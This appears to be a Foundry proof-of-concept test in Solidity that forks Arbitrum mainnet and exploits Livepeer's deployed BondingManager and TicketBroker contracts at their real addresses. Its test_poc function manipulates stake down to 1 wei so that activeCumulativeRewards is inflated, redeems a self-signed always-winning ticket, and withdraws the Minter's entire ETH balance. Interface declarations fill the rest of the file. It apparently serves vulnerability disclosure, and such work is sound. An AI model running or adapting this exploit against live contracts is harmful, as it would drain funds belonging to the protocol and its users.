pragma solidity ^0.8.9;

import {console} from "forge-std/console.sol";
import {GovernorBaseTest} from "./base/GovernorBaseTest.sol";

// forge test --match-contract BondingManagerInflatedTicketPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 267164264
contract BondingManagerInflatedTicketPoc is GovernorBaseTest {

    LivepeerToken  lpt = LivepeerToken (0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager bm  = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker   tb  = TicketBroker  (0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager  rm  = RoundsManager (0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    address TICKET_SENDER;
    uint    TICKET_SENDER_KEY = 31337;

    function setUp() public {
        // Fund the attacker with 4010 LPT to main contract
        CHEATS.prank(MINTER);
        lpt.transfer(address(this), 4010 ether);
        // which in turn funds the second contract with 10 LPT
        lpt.transfer(address(0x1337), 10 ether);

        TICKET_SENDER = CHEATS.addr(TICKET_SENDER_KEY);
    }

    function test_poc() public {
        // Check start balance
        console.log("Start minter balance:", MINTER.balance / 1e14, "ETH");

        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
        lpt.approve(address(bm), type(uint).max);
        bm.bond(4000 ether, address(this));
        // Set reward and fee cut rate such that the transcoder gets all rewards but delegators get all fees
        bm.transcoder(1e6, 1e6);

        // Wait for the next round
        _nextRound();

        // Unbond all LPT except 1 wei, such that the transcoder becomes the last active transcoder wth 1 wei stake.
        bm.unbond(4000 ether - 1 wei);

        // Secondary attacker contract now bonds with the 10 LPT, kicking the main contract out of the active transcoders
        CHEATS.startPrank(address(0x1337));
        lpt.approve(address(bm), type(uint).max);
        bm.bond(10 ether, address(0x1337));
        CHEATS.stopPrank();

        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not active anymore)
        bm.reward();

        // Wait for the next round
        _nextRound();

        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: address(this),
            sender: TICKET_SENDER,
            faceValue: 1 ether,
            winProb: type(uint).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint(1337))),
            auxData: abi.encodePacked(rm.currentRound(), rm.blockHashForRound(rm.currentRound()))
        });

        // Sign it
        bytes32 ticketHash = keccak256(abi.encodePacked(
            ticket.recipient,
            ticket.sender,
            ticket.faceValue,
            ticket.winProb,
            ticket.senderNonce,
            ticket.recipientRandHash,
            ticket.auxData
        ));
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(TICKET_SENDER_KEY, signHash);

        // Ticket sender needs to deposit the assets (they'll be stolen back later)
        payable(TICKET_SENDER).transfer(1 ether);
        CHEATS.prank(TICKET_SENDER);
        tb.fundDeposit{value: 1 ether}();

        // Now redeeming the ticket will give 1 ETH in fees to the main attacker
        // which will be multiplied with a huge multiplier due to the stake being 1 wei and the
        // activeCumulativeRewards being much higher.
        tb.redeemWinningTicket(ticket, abi.encodePacked(r, s, v), 1337);

        // Convert to actual fees
        bm.claimEarnings(0);

        // And withdraw the entire Minter's ETH balance
        bm.withdrawFees(payable(address(this)), MINTER.balance);

        // gg wp
        console.log("Final minter balance:", MINTER.balance / 1e14, "ETH");
    }

    function _nextRound() private {
        CHEATS.roll(block.number + 6377);
        rm.initializeRound();
    }

    receive() external payable {}
}

interface BondingManager {
    type DelegatorStatus is uint8;
    type TranscoderStatus is uint8;

    event Bond(
        address indexed newDelegate,
        address indexed oldDelegate,
        address indexed delegator,
        uint256 additionalAmount,
        uint256 bondedAmount
    );
    event EarningsClaimed(
        address indexed delegate,
        address indexed delegator,
        uint256 rewards,
        uint256 fees,
        uint256 startRound,
        uint256 endRound
    );
    event ParameterUpdate(string param);
    event Rebond(address indexed delegate, address indexed delegator, uint256 unbondingLockId, uint256 amount);
    event Reward(address indexed transcoder, uint256 amount);
    event SetController(address controller);
    event TranscoderActivated(address indexed transcoder, uint256 activationRound);
    event TranscoderDeactivated(address indexed transcoder, uint256 deactivationRound);
    event TranscoderSlashed(address indexed transcoder, address finder, uint256 penalty, uint256 finderReward);
    event TranscoderUpdate(address indexed transcoder, uint256 rewardCut, uint256 feeShare);
    event TransferBond(
        address indexed oldDelegator,
        address indexed newDelegator,
        uint256 oldUnbondingLockId,
        uint256 newUnbondingLockId,
        uint256 amount
    );
    event TreasuryReward(address indexed transcoder, address treasury, uint256 amount);
    event Unbond(
        address indexed delegate,
        address indexed delegator,
        uint256 unbondingLockId,
        uint256 amount,
        uint256 withdrawRound
    );
    event WithdrawFees(address indexed delegator, address recipient, uint256 amount);
    event WithdrawStake(address indexed delegator, uint256 unbondingLockId, uint256 amount, uint256 withdrawRound);

    function bond(uint256 _amount, address _to) external;
    function bondForWithHint(
        uint256 _amount,
        address _owner,
        address _to,
        address _oldDelegateNewPosPrev,
        address _oldDelegateNewPosNext,
        address _currDelegateNewPosPrev,
        address _currDelegateNewPosNext
    ) external;
    function bondWithHint(
        uint256 _amount,
        address _to,
        address _oldDelegateNewPosPrev,
        address _oldDelegateNewPosNext,
        address _currDelegateNewPosPrev,
        address _currDelegateNewPosNext
    ) external;
    function checkpointBondingState(address _account) external;
    function claimEarnings(uint256 _endRound) external;
    function controller() external view returns (address);
    function currentRoundTotalActiveStake() external view returns (uint256);
    function delegatorStatus(address _delegator) external view returns (DelegatorStatus);
    function getDelegator(address _delegator)
        external
        view
        returns (
            uint256 bondedAmount,
            uint256 fees,
            address delegateAddress,
            uint256 delegatedAmount,
            uint256 startRound,
            uint256 lastClaimRound,
            uint256 nextUnbondingLockId
        );
    function getDelegatorUnbondingLock(address _delegator, uint256 _unbondingLockId)
        external
        view
        returns (uint256 amount, uint256 withdrawRound);
    function getFirstTranscoderInPool() external view returns (address);
    function getNextTranscoderInPool(address _transcoder) external view returns (address);
    function getTotalBonded() external view returns (uint256);
    function getTranscoder(address _transcoder)
        external
        view
        returns (
            uint256 lastRewardRound,
            uint256 rewardCut,
            uint256 feeShare,
            uint256 lastActiveStakeUpdateRound,
            uint256 activationRound,
            uint256 deactivationRound,
            uint256 activeCumulativeRewards,
            uint256 cumulativeRewards,
            uint256 cumulativeFees,
            uint256 lastFeeRound
        );
    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round)
        external
        view
        returns (
            uint256 totalStake,
            uint256 transcoderRewardCut,
            uint256 transcoderFeeShare,
            uint256 cumulativeRewardFactor,
            uint256 cumulativeFeeFactor
        );
    function getTranscoderPoolMaxSize() external view returns (uint256);
    function getTranscoderPoolSize() external view returns (uint256);
    function isActiveTranscoder(address _transcoder) external view returns (bool);
    function isRegisteredTranscoder(address _transcoder) external view returns (bool);
    function isValidUnbondingLock(address _delegator, uint256 _unbondingLockId) external view returns (bool);
    function nextRoundTotalActiveStake() external view returns (uint256);
    function nextRoundTreasuryRewardCutRate() external view returns (uint256);
    function pendingFees(address _delegator, uint256 _endRound) external view returns (uint256);
    function pendingStake(address _delegator, uint256 _endRound) external view returns (uint256);
    function rebond(uint256 _unbondingLockId) external;
    function rebondFromUnbonded(address _to, uint256 _unbondingLockId) external;
    function rebondFromUnbondedWithHint(address _to, uint256 _unbondingLockId, address _newPosPrev, address _newPosNext)
        external;
    function rebondWithHint(uint256 _unbondingLockId, address _newPosPrev, address _newPosNext) external;
    function reward() external;
    function rewardWithHint(address _newPosPrev, address _newPosNext) external;
    function setController(address _controller) external;
    function setCurrentRoundTotalActiveStake() external;
    function setNumActiveTranscoders(uint256 _numActiveTranscoders) external;
    function setTreasuryBalanceCeiling(uint256 _ceiling) external;
    function setTreasuryRewardCutRate(uint256 _cutRate) external;
    function setUnbondingPeriod(uint64 _unbondingPeriod) external;
    function slashTranscoder(address _transcoder, address _finder, uint256 _slashAmount, uint256 _finderFee) external;
    function targetContractId() external view returns (bytes32);
    function transcoder(uint256 _rewardCut, uint256 _feeShare) external;
    function transcoderStatus(address _transcoder) external view returns (TranscoderStatus);
    function transcoderTotalStake(address _transcoder) external view returns (uint256);
    function transcoderWithHint(uint256 _rewardCut, uint256 _feeShare, address _newPosPrev, address _newPosNext)
        external;
    function transferBond(
        address _delegator,
        uint256 _amount,
        address _oldDelegateNewPosPrev,
        address _oldDelegateNewPosNext,
        address _newDelegateNewPosPrev,
        address _newDelegateNewPosNext
    ) external;
    function treasuryBalanceCeiling() external view returns (uint256);
    function treasuryRewardCutRate() external view returns (uint256);
    function unbond(uint256 _amount) external;
    function unbondWithHint(uint256 _amount, address _newPosPrev, address _newPosNext) external;
    function unbondingPeriod() external view returns (uint64);
    function updateTranscoderWithFees(address _transcoder, uint256 _fees, uint256 _round) external;
    function withdrawFees(address payable _recipient, uint256 _amount) external;
    function withdrawStake(uint256 _unbondingLockId) external;
}

interface LivepeerToken {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 amount);
    event Mint(address indexed to, uint256 amount);
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 _amount) external;
    function burnFrom(address _from, uint256 _amount) external;
    function decimals() external view returns (uint8);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function mint(address _to, uint256 _amount) external;
    function name() external view returns (string memory);
    function nonces(address owner) external view returns (uint256);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
    function renounceRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface RoundsManager {
    event NewRound(uint256 indexed round, bytes32 blockHash);
    event ParameterUpdate(string param);
    event SetController(address controller);

    function blockHash(uint256 _block) external view returns (bytes32);
    function blockHashForRound(uint256 _round) external view returns (bytes32);
    function blockNum() external view returns (uint256);
    function controller() external view returns (address);
    function currentRound() external view returns (uint256);
    function currentRoundInitialized() external view returns (bool);
    function currentRoundLocked() external view returns (bool);
    function currentRoundStartBlock() external view returns (uint256);
    function initializeRound() external;
    function lastInitializedRound() external view returns (uint256);
    function lastRoundLengthUpdateRound() external view returns (uint256);
    function lastRoundLengthUpdateStartBlock() external view returns (uint256);
    function lipUpgradeRound(uint256) external view returns (uint256);
    function roundLength() external view returns (uint256);
    function roundLockAmount() external view returns (uint256);
    function setController(address _controller) external;
    function setLIPUpgradeRound(uint256 _lip, uint256 _round) external;
    function setRoundLength(uint256 _roundLength) external;
    function setRoundLockAmount(uint256 _roundLockAmount) external;
    function targetContractId() external view returns (bytes32);
}

library MReserve {
    struct ReserveInfo {
        uint256 fundsRemaining;
        uint256 claimedInCurrentRound;
    }
}

library MTicketBrokerCore {
    struct Ticket {
        address recipient;
        address sender;
        uint256 faceValue;
        uint256 winProb;
        uint256 senderNonce;
        bytes32 recipientRandHash;
        bytes auxData;
    }
}

library MixinTicketBrokerCore {
    struct Sender {
        uint256 deposit;
        uint256 withdrawRound;
    }
}

interface TicketBroker {
    event DepositFunded(address indexed sender, uint256 amount);
    event ParameterUpdate(string param);
    event ReserveClaimed(address indexed reserveHolder, address claimant, uint256 amount);
    event ReserveFunded(address indexed reserveHolder, uint256 amount);
    event SetController(address controller);
    event Unlock(address indexed sender, uint256 startRound, uint256 endRound);
    event UnlockCancelled(address indexed sender);
    event WinningTicketRedeemed(
        address indexed sender,
        address indexed recipient,
        uint256 faceValue,
        uint256 winProb,
        uint256 senderNonce,
        uint256 recipientRand,
        bytes auxData
    );
    event WinningTicketTransfer(address indexed sender, address indexed recipient, uint256 amount);
    event Withdrawal(address indexed sender, uint256 deposit, uint256 reserve);

    function batchRedeemWinningTickets(
        MTicketBrokerCore.Ticket[] memory _tickets,
        bytes[] memory _sigs,
        uint256[] memory _recipientRands
    ) external;
    function cancelUnlock() external;
    function claimableReserve(address _reserveHolder, address _claimant) external view returns (uint256);
    function claimedReserve(address _reserveHolder, address _claimant) external view returns (uint256);
    function controller() external view returns (address);
    function fundDeposit() external payable;
    function fundDepositAndReserve(uint256 _depositAmount, uint256 _reserveAmount) external payable;
    function fundDepositAndReserveFor(address _addr, uint256 _depositAmount, uint256 _reserveAmount) external payable;
    function fundReserve() external payable;
    function getReserveInfo(address _reserveHolder) external view returns (MReserve.ReserveInfo memory info);
    function getSenderInfo(address _sender)
        external
        view
        returns (MixinTicketBrokerCore.Sender memory sender, MReserve.ReserveInfo memory reserve);
    function getTicketHash(MTicketBrokerCore.Ticket memory _ticket) external pure returns (bytes32);
    function isUnlockInProgress(address _sender) external view returns (bool);
    function redeemWinningTicket(MTicketBrokerCore.Ticket memory _ticket, bytes memory _sig, uint256 _recipientRand)
        external;
    function setController(address _controller) external;
    function setTicketValidityPeriod(uint256 _ticketValidityPeriod) external;
    function setUnlockPeriod(uint256 _unlockPeriod) external;
    function targetContractId() external view returns (bytes32);
    function ticketValidityPeriod() external view returns (uint256);
    function unlock() external;
    function unlockPeriod() external view returns (uint256);
    function usedTickets(bytes32) external view returns (bool);
    function withdraw() external;
}
